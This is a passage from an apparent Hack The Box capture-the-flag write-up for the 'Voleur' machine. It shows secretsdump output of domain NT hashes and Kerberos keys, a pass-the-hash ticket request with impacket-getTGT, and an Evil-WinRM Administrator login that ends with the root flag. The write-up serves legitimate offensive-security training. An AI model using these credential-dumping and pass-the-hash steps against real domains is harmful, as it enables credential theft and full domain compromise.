[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...   
```
## Evil-WinRM

We need a ticket for the `Administrator`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/root]
└─$ impacket-getTGT voleur.htb/'Administrator'  -hashes ':e656e07c56d831611b577b160b259ad2'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache

─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Voleur/root/Administrator.ccache 
```

Now we can login with [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) again:

```bash
─$ evil-winrm -i dc.voleur.htb -k Administrator.ccache -r voleur.htb 
```

And we can retrieve the root flag:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
  HTB{{REDACTED_FLAG}}
```

Pwned !! 

This machine was very instructing on AD and tool troubleshooting. 